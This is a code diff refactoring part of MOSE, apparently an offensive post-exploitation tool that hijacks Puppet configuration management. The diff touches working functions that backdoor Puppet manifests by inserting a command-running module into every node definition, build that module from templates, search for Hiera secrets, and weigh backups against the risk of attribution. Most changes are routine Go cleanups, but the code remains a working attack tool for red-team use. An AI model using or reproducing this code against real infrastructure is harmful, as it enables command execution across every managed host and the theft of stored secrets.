@@ -9,7 +9,6 @@ import (
 	"flag"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -80,11 +79,12 @@ func getAgents() []string {
 	}
 
 	agents := cleanAgentOutput(cmdOut)
-	if err != nil {
+	switch {
+	case err != nil:
 		log.Fatal().Msg("This system is not a Puppet Server, exiting.")
-	} else if len(agents) == 1 && strings.Contains(agents[0], netutils.GetHostname()) {
+	case len(agents) == 1 && strings.Contains(agents[0], netutils.GetHostname()):
 		log.Fatal().Msg("The Puppet Server is the only agent, and you've pwned it. Exiting.")
-	} else if strings.Contains(cmdOut, "No certificates to list") {
+	case strings.Contains(cmdOut, "No certificates to list"):
 		log.Fatal().Msg("There are no agents configured with this Puppet Server, exiting.")
 	}
 
@@ -105,7 +105,11 @@ func getModules(moduleLoc string) []string {
 	if err != nil {
 		moseutils.ColorMsgf("Error: Unable to unmarshal %v", jsonOut)
 	}
-	preParsed := jsonOut["modules_by_path"].(map[string]interface{})
+	preParsed, ok := jsonOut["modules_by_path"].(map[string]interface{})
+	if !ok {
+		log.Error().Msg("Unable to parse modules_by_path from puppet output")
+		return modules
+	}
 	for key, value := range preParsed {
 		switch s := value.(type) {
 		default:
@@ -140,7 +144,9 @@ func backupManifest(manifestLoc string) {
 		path = filepath.Join(puppetBackupLoc, filepath.Base(manifestLoc))
 	}
 	if !system.FileExists(path + ".bak.mose") {
-		_ = system.CpFile(manifestLoc, path+".bak.mose")
+		if err := system.CpFile(manifestLoc, path+".bak.mose"); err != nil {
+			log.Error().Err(err).Msg("Failed to create backup manifest")
+		}
 		return
 	}
 	moseutils.ColorMsgf("Backup of the manifest (%v.bak.mose) already exists.", manifestLoc)
@@ -154,16 +160,16 @@ func backdoorManifest(manifestLoc string) {
 	eof := regexp.MustCompile(`}\s*?$`)
 	comments := regexp.MustCompile(`#.*`)
 
-	fileContent, err := ioutil.ReadFile(manifestLoc)
+	fileContent, err := os.ReadFile(manifestLoc)
 	if err != nil {
-		log.Fatal().Err(err).Msg("Failed to backdoor the manifest located at %s, exiting.")
+		log.Fatal().Err(err).Msgf("Failed to backdoor the manifest located at %s, exiting.", manifestLoc)
 	}
 
 	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))
 	content = fmt.Sprint(eof.ReplaceAllString(content, insertString+"}\n"))
 	content = fmt.Sprint(nodeLines.ReplaceAllString(content, insertString+"}\nnode"))
 
-	err = ioutil.WriteFile(manifestLoc, []byte(content), 0644)
+	err = os.WriteFile(manifestLoc, []byte(content), 0644)
 	if err != nil {
 		log.Fatal().Err(err).Msgf("Failed to backdoor the manifest located at %s, exiting.", manifestLoc)
 	}
@@ -182,28 +188,19 @@ func generateModule(moduleManifest string, cmd string) bool {
 		FileName:  uploadFileName,
 		FilePath:  uploadFilePath,
 	}
-	s, err := pkger.Open("/tmpl/puppetModule.tmpl")
-
+	templatePath := "/tmpl/puppetModule.tmpl"
 	if uploadFileName != "" {
-		s, err = pkger.Open("/tmpl/puppetFileUploadModule.tmpl")
+		templatePath = "/tmpl/puppetFileUploadModule.tmpl"
 	}
-
+	templateContent, err := loadTemplateContent(templatePath)
 	if err != nil {
 		log.Fatal().Err(err).Msg("Parse failure pkger: ")
 	}
-	defer s.Close()
 
-	dat := new(strings.Builder)
-	_, err = io.Copy(dat, s)
+	t, err := template.New("puppetModule").Parse(templateContent)
 
 	if err != nil {
-		log.Fatal().Err(err).Msg("")
-	}
-
-	t, err := template.New("puppetModule").Parse(dat.String())
-
-	if err != nil {
-		log.Debug().Msg(dat.String())
+		log.Debug().Msg(templateContent)
 		log.Fatal().Err(err).Msg("Parse failure template: ")
 	}
 
@@ -214,14 +211,31 @@ func generateModule(moduleManifest string, cmd string) bool {
 	}
 
 	err = t.Execute(f, puppetCommand)
-
 	if err != nil {
+		_ = f.Close()
 		log.Fatal().Err(err).Msg("Execute: ")
 	}
-
-	f.Close()
+	if err := f.Close(); err != nil {
+		log.Error().Err(err).Msg("Failed closing module manifest")
+	}
 
 	return true
+}
+
+func loadTemplateContent(templatePath string) (string, error) {
+	s, err := pkger.Open(templatePath)
+	if err != nil {
+		return "", err
+	}
+	dat := new(strings.Builder)
+	if _, err := io.Copy(dat, s); err != nil {
+		_ = s.Close()
+		return "", err
+	}
+	if err := s.Close(); err != nil {
+		return "", err
+	}
+	return dat.String(), nil
 }
 
 func createModule(manifestLoc string, moduleName string, cmd string) {
@@ -317,11 +331,11 @@ func findHieraSecrets() {
 
 func doCleanup(manifestLocs []string) {
 	moseutils.TrackChanges(cleanupFile, cleanupFile)
-	ans, err := moseutils.AskUserQuestion("Would you like to remove all files created by running MOSE previously? ", osTarget)
+	answer, err := moseutils.AskUserQuestion("Would you like to remove all files created by running MOSE previously? ", osTarget)
 	if err != nil {
 		log.Fatal().Msg("Quitting...")
 	}
-	moseutils.RemoveTracker(cleanupFile, osTarget, ans)
+	moseutils.RemoveTracker(cleanupFile, osTarget, answer)
 
 	for _, manifestLoc := range manifestLocs {
 		path := manifestLoc
@@ -329,20 +343,20 @@ func doCleanup(manifestLocs []string) {
 			path = filepath.Join(puppetBackupLoc, filepath.Base(manifestLoc))
 		}
 
-		path = path + ".bak.mose"
+		path += ".bak.mose"
 
 		if !system.FileExists(path) {
 			moseutils.ColorMsgf("Backup file %s does not exist, skipping", path)
 			continue
 		}
 		ans2 := false
-		if !ans {
+		if !answer {
 			ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", manifestLoc, path), osTarget)
 			if err != nil {
 				log.Fatal().Err(err).Msg("Quitting...")
 			}
 		}
-		if ans || ans2 {
+		if answer || ans2 {
 			_ = system.CpFile(path, manifestLoc)
 			os.Remove(path)
 		}
@@ -368,7 +382,7 @@ func main() {
 	}
 
 	for _, manifestLoc := range manifestLocs {
-		if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", osTarget); ans && err == nil {
+		if answer, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", osTarget); answer && err == nil {
 			backupManifest(manifestLoc)
 		} else if err != nil {
 			log.Fatal().Err(err).Msg("Quitting...")
